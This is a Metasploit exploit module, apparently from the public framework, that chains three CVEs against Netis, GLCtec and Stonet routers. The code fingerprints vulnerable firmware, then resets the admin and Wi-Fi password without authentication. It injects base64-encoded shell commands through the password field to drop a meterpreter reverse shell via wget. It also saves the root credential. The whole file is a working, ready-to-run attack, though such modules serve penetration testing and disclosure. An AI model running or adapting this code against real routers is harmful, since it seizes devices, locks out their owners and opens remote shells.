##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Netis Router Exploit Chain Reactor (CVE-2024-48455, CVE-2024-48456 and CVE-2024-48457).',
        'Description' => %q{
          Several Netis Routers including rebranded routers from GLCtec and Stonet suffer from a command injection
          vulnerability at the change admin password page of the router web interface (see CVE-2024-48456 for more details).
          The vulnerability stems from improper handling of the 'password' and 'new password' parameter within the
          router's web interface. Attackers can inject a command in the 'password' or 'new password' parameter,
          encoded in base64, to exploit the command injection vulnerability. When exploited, this can lead to
          command execution, potentially allowing the attacker to take full control of the router.
          An attacker needs to be authenticated to initiate this RCE, however CVE-2024-48457 allows an unauthenticated
          attacker to reset the Wifi and router password, hence gaining full root access to the router to execute the RCE.

          Last but not least, CVE-2024-48455 allows for unauthenticated information disclosure revealing sensitive configuration
          information of the router which can be used by the attacker to determine if the router is running specific vulnerable
          firmware.

          The following router firmware versions are vulnerable:
          * netis_MW5360_V1.0.1.3031_fw.bin
          * Netis_MW5360-1.0.1.3442.bin
          * Netis_MW5360_RUSSIA_844.bin
          * netis_NC21_V3.0.0.3800.bin (https://www.netisru.com/support/downinfo.html?id=40)
          * netis_NC63_V3.0.0.3327.bin (https://www.netis-systems.com/support/downinfo.html?id=35)
          * netis_NC63_v4_Bangladesh-V3.0.0.3889.bin (https://www.netis-systems.com/support/downinfo.html?id=35)
          * Netis_NC63-V3.0.0.3833.bin (https://www.netisru.com/support/downinfo.html?id=35)
          * netis_app_BeeWiFi_NC63_v4_Bangladesh-V3.0.0.3503.bin
          * netis_NC65_V3.0.0.3749.bin
          * Netis_NC65_Bangladesh-V3.0.0.3508.bin (https://www.netis-systems.com/support/downinfo.html?id=34)
          * Netis_NC65v2-V3.0.0.3800.bin (https://www.netisru.com/support/downinfo.html?id=34)
          * netis_NX10_V2.0.1.3582_fw.bin
          * netis_NX10_V2.0.1.3643.bin
          * Netis_NX10_v1_Bangladesh-V3.0.0.4142.bin (https://www.netis-systems.com/support/downinfo.html?id=33)
          * netis_NX10-V3.0.1.4205.bin (https://www.netisru.com/support/downinfo.html?id=33)
          * netis_app_BeeWiFi_NC21_v4_Bangladesh-V3.0.0.3329.bin
          * netis_app_BeeWiFi_NC21_v4_Bangladesh-V3.0.0.3500.bin
          * Netis_NC21_v2_Bangladesh-V3.0.0.3854.bin (https://www.netis-systems.com/support/downinfo.html?id=40)
          * GLC_ALPHA_AC3-V3.0.2.115.bin (https://drive.google.com/drive/folders/1P69yUfzeZeR6oABmIdcJ6fG57-Xjrzx6)
          * potentially others...
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>' #  Discovery of the vulnerability and MSF module contributor
        ],
        'References' => [
          ['CVE', '2024-48455'],
          ['CVE', '2024-48456'],
          ['CVE', '2024-48457'],
          ['URL', 'https://attackerkb.com/topics/L6qgmDIMa1/cve-2024-48455'],
          ['URL', 'https://attackerkb.com/topics/Urqj4ggP4j/cve-2024-48456'],
          ['URL', 'https://attackerkb.com/topics/ty1TOgc40f/cve-2024-48457'],
          ['URL', 'https://github.com/users/h00die-gr3y/projects/1']
        ],
        'DisclosureDate' => '2024-12-27',
        'Platform' => ['linux'],
        'Arch' => [ARCH_MIPSLE],
        'Privileged' => true,
        'Targets' => [
          [
            'Linux Dropper',
            {
              'Platform' => ['linux'],
              'Arch' => [ARCH_MIPSLE],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => false,
          'RPORT' => 80,
          'HttpClientTimeout' => 60
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'The Netis router endpoint URL', '/' ]),
      OptInt.new('CMD_DELAY', [true, 'Delay in seconds between payload commands to avoid locking', 30])
    ])
  end

  # CVE-2024-48457: unauthenticated password reset that resets the Wifi and root password of the router
  # affected components: web endpoint /cgi-bin/skk_set.cgi and binary /bin/scripts/start_wifi.sh
  def set_router_password
    @password = Rex::Text.rand_text_alphanumeric(8..12)
    password_b64 = Base64.strict_encode64(@password)
    print_status('Resetting router password for authentication.')
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/cgi-bin/skk_set.cgi'),
      'vars_post' => {
        'wl_idx' => 0,
        'wlanMode' => 0,
        'encrypt' => 4,
        'wpaPsk' => password_b64,
        'wpaPskType' => 2,
        'wpaPskFormat' => 0,
        'password' => password_b64,
        'autoUpdate' => 0,
        'firstSetup' => 1,
        'quick_set' => 'ap',
        'app' => 'wan_set_shortcut',
        'wl_link' => 0
      }
    })
    # in some cases no SUCCESS response is returned however the password has been set succesfully
    # therefore check if the login is successfull and get the password cookie
    print_status("Logging in with the new router password #{@password} to get the password cookie.")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/cgi-bin/login.cgi'),
      'keep_cookies' => true,
      'vars_post' => {
        'password' => password_b64
      }
    })
    return res&.code == 200 && res.body.include?('SUCCESS')
  end

  # CVE-2024-48456: remote code execution in the parameter password at the change password page at
  # the router web interface
  # affected components: web endpoint /cgi-bin/skk_set.cgi and binary /bin/scripts/password.sh
  def execute_command(cmd, _opts = {})
    # store name of payload and cleanup payload file when session is established (see def on_new_session)
    @payload_name = cmd.split('+x')[1].strip if cmd.include?('chmod +x')

    # skip last command to remove payload because it does not work
    unless cmd.include?('rm -f')
      payload = Base64.strict_encode64("`#{cmd}`")
      print_status("Executing #{cmd}")
      send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, '/cgi-bin/skk_set.cgi'),
        'keep_cookies' => true,
        'vars_post' => {
          'password' => payload,
          'new_pwd_confirm' => payload,
          'passwd_set' => 'passwd_set',
          'mode_name' => 'skk_set',
          'app' => 'passwd',
          'wl_link' => 0
        }
      })
    end
  end

  def on_new_session(_session)
    # cleanup payload file
    register_files_for_cleanup(@payload_name.to_s)
    super
  end

  # CVE-2024-48455: information disclosure where an unauthenticated remote attacker can obtain sensitive information
  # affected components: web endpoint /cgi-bin/skk_set.cgi via the mode_name and wl_link parameter
  def check
    print_status("Checking if #{peer} can be exploited.")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/cgi-bin/skk_get.cgi'),
      'vars_post' => {
        'mode_name' => 'skk_get',
        'wl_link' => 0
      }
    })
    return CheckCode::Unknown('No valid response received from target.') unless res&.code == 200 && res.body.include?('version')

    # trying to get the model and version number
    # unfortunately JSON parsing fails for some routers, so we need to use this ugly REGEX :-(
    # Examples:
    # {'version':'Netis(MW5360)-V1.0.1.98','vender':'RUSSIA','model':'MW5360','time_now':'2024/12/29 01:37:58','sys_date':'2024'}
    # {"version":"netis(NC65)-V3.0.0.3800","vender":"CIS","easy_mesh":"EASYMESH","module":"NC65v2","ax_support":"0"}
    version = res.body.match(/(?:version\s*'|")\s*:\s*.?((\\|[^'|"])*)/)
    # when found, remove whitespaces and make all uppercase to avoid suprises in string splitting and comparison
    unless version.nil?
      version_number = version[1].upcase.split('-V')[1].gsub(/[[:space:]]/, '')
      # The model number part is usually something like Netis(NC63)-V3.0.0.3131,
      # but occassionally you see things like Stonet-N3D-V3.0.0.4142, or NX10-V3.0.0.4142
      if version[1].upcase.split('-V')[0].include?('(')
        model_number = version[1].upcase.split('-V')[0][/\(([^)]+)/, 1].gsub(/[[:space:]]/, '')
      elsif version[1].upcase.split('-V')[0].include?('-')
        model_number = version[1].upcase.split('-V')[0][/-([^-]+)/, 1].gsub(/[[:space:]]/, '')
      else
        model_number = version[1].upcase.split('-V')[0]
      end
      # Check if target is vulnerable
      if version_number
        case model_number.split('V')[0] # split if any hardware version is part of the model number (NC65V2)
        when 'NC63', 'NC65', 'NC66', 'NC21', 'NX10', 'NX30', 'NX31', 'NX62', 'MW5360', 'ALPHA-AC3', 'ALPHA-AC2', 'ALPHA-AC4'
          return CheckCode::Appears(version[1].to_s) if Rex::Version.new(version_number) >= Rex::Version.new('1.0.0.0')
        end
        return CheckCode::Safe(version[1].to_s)
      end
    end
    CheckCode::Safe
  end

  def exploit
    fail_with(Failure::NoAccess, 'Unable to set the router password and retrieve the password cookie.') unless set_router_password

    # store router admin password in msf database which is also the password of root ;-)
    print_status('Saving router credentials (root) at the msf database.')
    store_valid_credential(user: 'root', private: @password)

    # wait a while with exploit execution to avoid locking
    sleep(datastore['CMD_DELAY'])
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed
      execute_cmdstager(noconcat: true, delay: datastore['CMD_DELAY'])
    end
  end
end
